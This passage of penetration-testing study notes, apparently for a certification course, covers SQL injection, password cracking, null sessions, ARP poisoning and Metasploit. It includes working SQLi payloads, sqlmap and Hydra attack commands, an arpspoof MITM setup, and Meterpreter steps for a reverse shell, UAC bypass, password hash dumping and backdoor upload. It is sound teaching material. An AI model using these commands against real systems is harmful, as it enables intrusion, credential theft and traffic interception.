- POST parameters
- HTTP Headers
  - User-Agent
  - Cookie
  - Accept

Tests can be:
- String terminators: `' and ''`
- SQL commands: `SELECT`, `UNION` and others
- SQL comments: `#` or `--`

##### Boolean Based SQLi

Once penentration testers find a way to tell when a condition is true or false, they can ask the database some simple True/False questions:
- Is the first letter of the username 'a'?
- Does this database contain three tables?
- ...

We can use two MySQL functions: `user()` and `substring()`
- `user()` returns the name of the user currently using the database:

```sql
select user();
```

- `substring()` returns a substring of the given argument. It takes 3 parameters:
  - the input string
  - the position of the substring
  - its length

```sql
select substring('elarnsecurity', 2, 1)
```

We can use both together:
```sql
substring(user(), 1, 1);
--- it might return 'r' for 'root' user

substring(user(), 1, 1) = 'r'
-- if it returns 1 -> True; 0 -> False
```

Combining those features, we can iterate over the letters of the username by using payloads as:

```sql
' or substr(user(), 1, 1) =='a
' or substr(user(), 1, 1) =='b
```

when we find the first letter then we can move to the second and so on in order to guess the entire username.

##### UNION Based SQL Injections

- Many times some of the results of a query are directly displayed on the output page
- This feature can be exploited using the UNION SQL command
- If the payload makes the result of the original query empty, then we can have the results of another, attacker controlled, query shown on the page
- The following payload fornces the web application to display the result of the `user()` function on the output page
- The comment at the end of the line prevents the follwing part of the original query from being parsed by the database, comments the rest from the original query
- The comment also contains a third dash because most of the browsers automaticall remove trailing spaces in the URL so, if you need to inject a comment via a GET request, you have to add a character after the trailing space of the comment

```sql
SELECT description FROM items where id='' UNION SELECT user(); -- -';
```

- To exploit a SQL injection you first need to know how many fields the vulnerable query selects, you do this by trial and error
- We know there's an injection by `' UNION sELECT null; -- -`, this should display:

```
Warning: mysql_fetch_array() expects parameter 1 to be mysql_result, boolean given in /var/www/view.php on line 32
```

- We can try with two fields: `' UNION SELECT null null; -- -` and three even to confirm that the original query only has two fields
- Once we know how many fields are in the query it's time to test which fields are part of the output page
- You can do that by injecting some known values and checking thee results in the output page, as in: `' UNION SELECT 'elsid1', 'elsid2'; -- -`
- Now we can exploit the injection: `' UNION SELECT user(), 'elsid2'; -- -`
- Not only `SELECT` queries are vulnerable

##### SQLMap

- Can detect and exploit SQL injections
- Needs to know the vulnerable URL and the parameter to test for a SQLi

```bash
sqlmap -u <URL> -p <inejction parameter> [options]
sqlmap -u 'http://victim.site/view.php?id=1141' -p id --technique=U
# technique=U --> UNION based SQL injection technique
sqlmap -u <url> --data=<POST string> -p id [options]
# You can copy the POST string from a request intercepted in Burp Suite
```

#### <span style="color:red">VIDEO - (14/16) SQL Injection</span>
#### <span style="color:red">VIDEO - (15/16) Sqlmap</span>
#### <span style="color:red">(16/16) SQL Injection</span>

### System Attacks (6 items)

#### (1/6) Malware - Study Guide

Any software used to misuse computer sistems with the intent to cause a DoS, spy on users activity, get aunauthorized control over one or more computer systems, etc.

- **Virus**: small piece of code that spreads from computer to computer without any direct action or authorization by the owners of the infected machines, normally copying themselves to special sections of the HDD or inside legitimate programs or documents, running everytime an infected program or file is opened
- **Trojan Horse**: comes embedded in seemingly harmless file, being _backdoors_ the most common
- **Backdoors**: two components, server and client
  - Server runs on the victim machine listening on the network in order to accept connections
  - Client runs on the attacker machine
  - `Netbus` or `SubSeven` are very famous
  - If the backdoor server sits behind a firewall, the easiest way to achive a connection is using a **Connect-back Backdoor** or **Reverse Backdoor**
  - A firewall cannot tell the difference between a user surfing the web and a backdoor connecting back to the attacker's machine
- **Rootkit**: designed to hide itself from users and antivirus programs in order to subvert the OS functioning, maintaining privileged access to the victim without being noticed
- **Bootkit**: rootkits which circumvent OS protection mechanisms by executing during the bootstrap phase
- **Adware**: annoying software that shows ads to computer users
- **Spyware**: collects info about user's activity (OS, visited websites, passwords)
- **Greyware**: either spyware, adware or both
- **Dialer**: tries to dial numbers on dial-up connections in order to collect money from the victim's phone bill, nowadays targeting smartphones
- **Keylogger**: special software that records every keystroke on the remote victim machine, winidow names and sends logs to a server controlled by the attacker
  - **Hardware keyloggers**
  - **Rootkit keyloggers**: stealthy and more invisible to the victim user than software keyloggers, hijacks the OS APIs to record keystrokes, intercepting the interrupt tables from the OS
- **Bots**: small pieces of software that get installed on millions of machines to perform DoS, and remotelly commanded by a C&C server
- **Ransomware**: encrypts a computer or smartphone with a secret key and aks its victim for a ransom
- **Data Stealing Malware**: most of the time targeted to a specific company and tailored to work on the target environment
- **Worms**: spread over the network by exploiting OS and SW vulnerabilities, exploiting credentials or misconfigurations to attack a service or a machine, usually worms are part of other software and they offer an entry point into the target system

#### <span style="color:red">VIDEO - (2/6) Backdoor</span>

#### (3/6) Password Attacks - Study Guide

- Normally stored in an encrypted form, preventing a malicious local user from getting to know user's passwords, using a _one-way encryption algorithm_, using a cryptographic hashing function
- _Password Cracking_ is the process of recovering clear-text passwords starting from their hash, where the attacker tries to guess the password
- There are two main strategies:
  - **Brute force attacks**
    - You try them all!
    - **Generate** and test all the possible valid passwords
    - Given enough time, a brute force attack is always successful
    - Only used when other attack vectors fail
    - Long passwords made by upper and lower case letters, numbers and symbols can take days or even years to crack
    - **John The Ripper**: can mount both brute force and dictionary-based attacks against a password database (see: `john --list=formats`)
      - Fast because of the high use of parallelization, crack strategies
      - `/etc/passwd`: contains info about user acccounts
      - `/etc/shadow`: contains info about the actual password hashes
      - `john` needs the username and the password hashes to be in the same file, therefore we need to use the `unshadow` utility that comes with _John The Ripper_
      - `john -incremental -users:<users list> <file to crack>`
      - `john -incremental -users:victim crackme`
      - To display the passwords recovered by `john`, use: `john --show <file>`
  - **Dictionary attacks**
    - Common passwords
    - Faster than pure brute fornce attacks
    - Poorly chosen or default passwords are more exposed to dictionary cracking
    - `john -wordlist=<custom wordlist file> <file to crack>`
    - Install password dictionaries: `apt-get install seclists`
      - You'll find them in `/usr/share/seclists/Passwords`
  - **Mangling words**
    - Variations on dictionary words
    - `john -wordlist=<custom wordlist file> <file to crack> -rules <file to crack>`
  - **Rainbow Tables**
    - Offer a tradeoff between the processing time needed to calculate the hash of a password and the storage space needed to mount an attack
    - A rainbow table contains links between the results of a run of one hashing function and another
    - Rainbow tables are BIG in file size, but reduces a cracking session from days to seconds
    - Great choice to crack simple and complex short passwords
    - `Ophcrack` rainbow cracking for Windows authentication passwords (can run on Linux too)

#### <span style="color:red">VIDEO - (4/6) John the Ripper</span>
#### <span style="color:red">VIDEO - (5/6) Hashcat</span>

#### (6/6) Buffer Overflow Attacks - Study Guide

A BoF attack can lead to:
- An app or OS crash (DoS)
- Privilege escalation
- Remote code execution
- Security features bypass

A buffer is an area in the RAM reserved for temporary data storage:
- User input
- Parts of a video file
- Server banners received by a client application
- etc.
- Buffers have a finite size, therefore: if an app develooper does not enforce a buffer limit, an attacker could find a way to write data beyond those limits and write there arbitrary code

##### Stack

- A stack is a data structure used to store data.
- Two operation for LIFO stacks: `pop` & `push`
- Space on the stack can be allocated from app's code
- An overflow happens when an attacker overwrites on a reserved space, so overwriting a function return address means getting control over the app
- If an attacker manages to overflow a local variable from the app, the attacker would be able to overwrite the _Base Pointer_ and then get a _Return Address_
- If the attacker overwrites the _Return Address_ with the right value, they are able to control the execution flow of the program
- This technique can be exploited by writing custom tools and applications or by using hacking tools as Metasploit

Being able to write a buffer overflow exploit requires a deep understanding of assembly programming, how applications and OS works and some exotic programming skills

### Network Attacks (17 items)

#### (1/17) Authentication Cracking - Study Guide

A similar approach to cracking a password can be used for every service requiring network authentication as: ssh, telnet, remote desktop, HTTP authentication, etc.

##### Brute Force vs Dictionary Attacks

- Performing pure brute force attacks over a network are very impractical because of the time needed to run each probe
  - Network latency
  - Delays on the attacked service
  - Processing time on the attacked server
- Network authentication cracking _relies almost entirely on dictionary-based attacks_, using dictionaries of common and defualt usernames and passwords

##### Hydra

- Fast, parallelized, network authentication cracker that supports different protocols:
  - Cisco auth
  - FTP
  - HTTP
  - IMAP
  - RDP
  - SMB
  - SSH
  - Telnet

To get detailed information about a module:
```bash
hydra -U rdp
```

To launch a dictionary attack against a service:

```bash
hydra -L users.txt -P pass.txt <service://server> <options>

# For instance
hydra -L users.txt -P pass.txt telnet://target.server

# Attack session against a password protected web resource
hydra -L users.txt -P pass.txt http-get://localhost/
```

#### <span style="color:red">VIDEO - (2/17) Hydra: Authentication Cracking</span>
#### <span style="color:red">LAB - (3/17) Bruteforce and Password cracking</span>

#### (4/17) Windows Shares - Study Guide

> Ability to:
> - Enumerate network resources
> - Attack Windows sessions
> - Obtain unathorized access to Windows resources

Windows' filesharing can be exploited.
- NetBIOS (Network Basic Input Output System)
  - Allows servers and clients to view network shares on a local area network
  - It can supply some of the following information while querying computers:
    - Hostname
    - NetBIOS name
    - Domain
    - Network shares
  - NetBIOS sits between the application layer and the IP layer (NetBIOS over TCP/IP)
    - UDP is used to perform name resolution and to carry other one-to-many datagram-based communications (like send small messages to the rest of the other hosts)
    - TCP is used for heavy traffic, as copying files over the network, using _NetBIOS sessions_
  - MS Windows browses the network using NetBIOS to:
    - Datagrams to list the sahres and the machines
    - Names to find workgroups
    - Sessions to transmit data to and from a Windows share

##### Shares

An authorized user can access shares by using **UNC Paths (Universal Naming Concetion Paths**:

```
\\ServerName\ShareName\file.nat

\\ComputerName\C$ # access to a volume (C$, D$, E$)

\\ComputerName\admin$ # points to the windows installation directory

\\ComputerName\ipc$  # used for inter-process communication, cannot be browsed via Explorer
```

Badly configured shares exploitation can lead to:
- Information disclosure
- Unauthorized file access
- Information leakage used to mount a targeted attack

#### (5/17) Null Sessions - Study Guide

- Null session attacks can be used to enumerate a lot of information:
  - Passwords
  - System users
  - System groups
  - Running system processes
- Remotely exploitable
- Nowadays Windows is configured to be immune to this kidn of attack
- Applicable to legacy systems
- Exploits an authentication vulnerability for Windows Adminstrative Shares, lets an attacker connect to a local or remote share wihtout authentication
- Enumerating shares is the first step needed to exploit a Windows machine vulnerable to null sessions

##### Tools

- `nbstat`: windows cmd tool that can display info about the target
- `nbstat -A <IP>`: displays info about a target

```
Name                Type      Status
----------------------------------------
ELS-WINXP     <00>  UNIQUE    Registered
WORKGROUP     <00>  GROUP     Registered
ELS-WINXP     <20>  UNIQUE    Registered
```

- `ELS-WINXP`: name
- `<00>`: workstation
- `UNIQUE`: this computer must have only one IP address assigned
- `<20>`: file sharing service is up and running on the machine
- Once an attacker knows that a machine has a 'File Server' service running, they can enumerate the shares by using `net view`:

```bash
NET VIEW <target IP>
```

- Share enumeration from a Linux Machine is provided by the *Samba suite*
- `nmblookup -A <target ip address>` gets the same results as `NET VIEW <target_IP>`

`smbclient` also displays *shares that are hidden when using Windows standard tools*:

```
# To enumerate the shares provided by a host
smbclient -L //<target_IP> -N

# -L allows to look at what services are available on a target
# -N forces the tool to not ask for a password
```

Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it's time to check if a null session attack is possible. We can exploit `IPC$` administrative share by trying to connect to it without valid credentials.

##### Checking for Null Sessions with Windows

To connect:

```
# This tells Windows to connect to the IPC$ share by using an empty password and an empty username!
NET USE \\<target IP address>\IPC$ '' /u:''

smbclient //<target_IP>/IPC$ -N
```

##### Exploiting Null Sessions with Enum

```bash
enum -S <target>  # -S lets you enumerate the shares of a machine
enum -U <target>  # -U enumerates the users
enum -P <target>  # -P check the password policy
```

- Checking password policies before running an authentication attack lets you fin-tune an attack tool to:
  - Prevent accounts locking
  - Prevent false positives
  - Choose your dictionary or your bruteforcer configuration (as knowing the min and max lengh of a password helps to save time)


##### Exploiting Null Session with Winfo

Automates null session exploitation.

Use with `-n` to tell the tool to use null sessions

```bash
winfo <target_IP> -n
```

##### Exploiting Null Sessoins with Enum4linux

A PERL script that can perform the same operations of `enum` and `winfo`, supplying some other features:
- User enumeration
- Share enumeration
- Group and member enumeration
- Password policy extraction
- OS info detection
- A nmblookup run
- Printer information extraction

#### <span style="color:red">VIDEO - (6/17) Null Session</span>
#### <span style="color:red">LAB - (7/17) Null Session</span>

#### (8/17) ARP Poisoning - Study Guide

ARM poisoning is a powerful attack you can use to intercept traffic on a switched network.
- If an attacker finds a way to manipulate the ARP cache, then the attacker will also be able to receive traffic destined to other IP addresses.

> Ability to:
> - Perform MITM attacks
> - Mount advanced attacks
> - Sniff traffic on a switched network

- The attacker can manipulate other hosts' ARP cache tables by sending gratuitous ARP replies.
- Gratuitous ARP replies = ARP reply messages
- The attacker exploits gratuitous ARP messages to tell the victims that they can reach a specific IP address at the attacker's machine MAC address
- The opration is performed on every victim
- As soon as the ARP cache table contains fake info, every packet of every communication between the poisoned nodes will be sent to the attacker's machine
- The attacker can prevent the poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds or so
- This operation lets the hacker sniff traffic between the poisoned hosts even if the machines sit on a switched network
- An attacker could also change the content of the packets
- This kind of attack can be used on an entire network and against a router, letting the attacker intercept the communication between a LAN and the internet

##### Dsniff Arpspoof

Collection of tools for network auditing and penetration testing, including `arpspoof`, designed to intercept traffic on a switched LAN. `arpspoof` redirects packets from a target host (or all hosts) on the LAN intended for another host on the LAN by forging ARP replies.

before running the tool, you have to enable the _Linux Kernel IP Forwarding_, a feature that transforms a Linux box into a router. By enabling IP forwarding, you tell your machine to forward the packets you interecept to the real destination host:

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward

# right after you can run arpspoof
arpspoof -i <interface> -t <target> -r <host>
# target and hosts are the victims IP addresses
```

####  <span style="color:red">VIDEO - (9/17) ARP Spoofing</span>
#### <span style="color:red">LAB - (10/17) ARP Poisoning</span>

#### (11/17) Metasploit - Study Guide

Metasploit is an open-source framework used for penetration testing and exploit development, giving a wide array of community contributed exploits and attack vectors that can be used against various systems. Extensible.

Basic workflow:
- Identifying a vulnerable service
- Searching for a proper exploit for that service
- Loading and configuring the exploit
- Loading and configuring the payload you want to use
- Running the exploit code and getting access to the vulnerable machine

A payload is used by an attacker to get:
- An OS Shell
- A VNC or RDP connection
- A Meterpreter shell
- The execution of an attacker-supplied application

A special payload, with many useful features under the pentesting point  of view is `meterpreter`.
```bash
msfconsole
> show -h
> search <searchterm> # search for a specific module by using the search cmd
> search skeleton
> search turboftp
> show exploits # impractical to use
> use exploit/windows/ftp/turboftp_port # to use exploit for turboftp
> info
> show options
> back
> show payloads
> set payload windows/meterpreter/reverse_tcp
> exploit
```

#### <span style="color:red">VIDEO -(12/17) Metasploit</span>
#### <span style="color:red">LAB -(13/17) Metasploit</span>

#### (14/17) Meterpreter - Study Guide

> Ability to:
> - Get a powerful shell on an exploited machine
> - Take control over an exploited machine
> - Install backdoors

Provides advanced features to:
- gather information
- transfer files between the attacker and victim machines
- install backdoors and more
- meterpreter can both wait for a connection on the target machine or connect back to the attacker machine
- a Meterpreter session is an advnaced shell on the target machine
- most used configurations are
  - *bind_tcp*: runs a server process on the target machine that waits for connections from the attacker machine
  - *reverse_tcp*: performs a TCP connection back to the attacker machine (helping to evade firewall rules)

Inside a `msfconsole`:

```bash
> search meterpreter
> set payload windows/meterpreter/reverse_tcp
> exploit
> sessions -l # current opened sessions
> sessions -i 1 # resume session 1
> sysinfo # retrieve info about the exploited machine
> ifconfig # prints the network configuration
> route # routing info
> getuid # which user is running the process exploited
> getsystem # Runs a privilege escalation routine on the target machine

# Bypass UAC (User Account Control policy of modern Windows OSs)
> background # switch from a meterpreter session to the msf console
> search bypassuac
> use exploit/windows/local/bypassuac
> set session 1
> exploit
> getuid

# Dumping the Password Database
> background
> use post/windows/gather/hashdump
> set session 2
> exploit

# Upload / download files
> download HaxLogs.log /root/
> upload /root/backdoor.exe c:\\Windows # note the backslash escaping
> shell
```

#### <span style="color:red">VIDEO - (15/17) Meterpreter</span>
#### <span style="color:red">VIDEO - (16/17) Beyond Remote Code Execution</span>
#### <span style="color:red">VIDEO - (17/17) Shells</span>

### Next Steps (6 items)

#### (1/6) What to do Next - Study Guide

- Each BlackBox Penetration Testing labs contains 2-4 machines that should be exploited
- There are flags per machine
- There could be more valuable information on the machine that could help you compromise additional hosts

> Study and get updated, new exploitation techniques are being discovered daily, start a blog, read feeds.

#### (2/6) Black-box Penetration Test 1
#### (3/6) Black-box Penetration Test 2
#### (4/6) Black-box Penetration Test 3
#### (5/6) Penetration Testing Approach - Study Guide

- Be curious
- Don't be ashamed of not knowing
- Try various methods until you are sure something is really safe
- Use search engines
- You can't remember everything
- Follow some existing penetration testing methodology (as OWASP)
  - So you can show your client what tests will be conducted
#### (6/6) Career Paths - Study Guide

- Web App / Network penetration tester
- Red teamer / Social engineer
- Reverse engineer
- Security researcher
- Mobile application penetration tester

Defense:

- Incident Response team member
- CCERT analyst
- Malware analyst
- Threat hunter
- Secure software developer
- Netowrk and systems defender

## References

- https://kentosec.com/2019/08/04/how-to-pass-the-ejpt/
- XSS Attacks: [hack.me](hack.me)

<!--
To do:
- [ ] Simplify main index, gather sections together, create draw.io drawings
- [ ] Make a tool list
- [ ] colorize code
- [ ] write code on gist and link here
-->